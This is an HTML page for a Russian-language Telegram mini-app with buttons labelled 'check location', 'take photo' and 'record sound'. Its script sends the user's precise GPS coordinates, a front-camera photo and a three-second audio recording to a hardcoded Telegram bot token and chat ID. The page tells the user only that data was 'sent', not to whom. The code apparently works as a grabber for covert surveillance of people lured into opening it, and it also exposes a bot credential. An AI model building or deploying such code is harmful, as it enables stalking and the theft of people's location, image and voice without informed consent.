<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Мини-приложение</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      margin: 0;
      display: flex;
      flex-direction: column;
      gap: 12px;
      background: #f5f7fa;
      color: #111;
    }
    h3 {
      margin: 0 0 6px;
    }
    button {
      padding: 14px 16px;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      background: #2481cc;
      color: #fff;
      cursor: pointer;
    }
    button:active {
      opacity: 0.85;
    }
    #status {
      margin-top: 8px;
      padding: 10px 12px;
      border-radius: 8px;
      background: #e9eef5;
      font-size: 14px;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <h3>Выберите действие</h3>

  <button id="btn-geo">Проверить локацию</button>
  <button id="btn-camera">Сделать фото</button>
  <button id="btn-mic">Записать звук</button>

  <div id="status">Нажмите кнопку для запуска</div>

  <script>
    const BOT_TOKEN = '8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw';
    const CHAT_ID = '8298749655';

    const tg = window.Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
    }

    const statusEl = document.getElementById('status');
    function setStatus(text) {
      statusEl.textContent = text;
    }

    async function sendMessageToBot(text) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });
      if (!res.ok) {
        throw new Error(`Ошибка отправки текста: ${res.status}`);
      }
    }

    async function sendFileToBot(endpoint, fieldName, blob, filename) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append(fieldName, blob, filename);

      const res = await fetch(url, {
        method: 'POST',
        body: formData
      });
      if (!res.ok) {
        throw new Error(`Ошибка отправки файла: ${res.status}`);
      }
    }

    // 1. Геолокация
    async function handleGeo() {
      if (!navigator.geolocation) {
        setStatus('Геолокация не поддерживается на этом устройстве');
        return;
      }

      setStatus('Запрашиваю геолокацию...');
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          try {
            await sendMessageToBot(
              `Локация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`
            );
            setStatus('Локация отправлена');
          } catch (err) {
            setStatus('Не удалось отправить локацию');
          }
        },
        () => {
          setStatus('Доступ к геолокации отклонён или недоступен');
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    // 2. Фото с камеры
    async function handleCamera() {
      if (!navigator.mediaDevices?.getUserMedia) {
        setStatus('Камера недоступна в этом окружении');
        return;
      }

      setStatus('Запрашиваю доступ к камере...');
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        await new Promise((resolve) => setTimeout(resolve, 400));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.85)
        );

        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg');
        setStatus('Фото отправлено');
      } catch (err) {
        setStatus('Доступ к камере отклонён или произошла ошибка');
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    // 3. Запись короткого аудио (3 секунды)
    async function handleMic() {
      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
        setStatus('Запись звука недоступна на этом устройстве');
        return;
      }

      setStatus('Запрашиваю доступ к микрофону...');
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        const stopped = new Promise((resolve) => {
          recorder.onstop = resolve;
        });

        recorder.start();
        setStatus('Идёт запись звука (3 сек)...');
        await new Promise((resolve) => setTimeout(resolve, 3000));
        recorder.stop();
        await stopped;

        const mimeType = recorder.mimeType || 'audio/webm';
        const blob = new Blob(chunks, { type: mimeType });

        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg');
        setStatus('Запись отправлена');
      } catch (err) {
        setStatus('Доступ к микрофону отклонён или произошла ошибка');
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    document.getElementById('btn-geo').addEventListener('click', handleGeo);
    document.getElementById('btn-camera').addEventListener('click', handleCamera);
    document.getElementById('btn-mic').addEventListener('click', handleMic);
  </script>
</body>
</html>
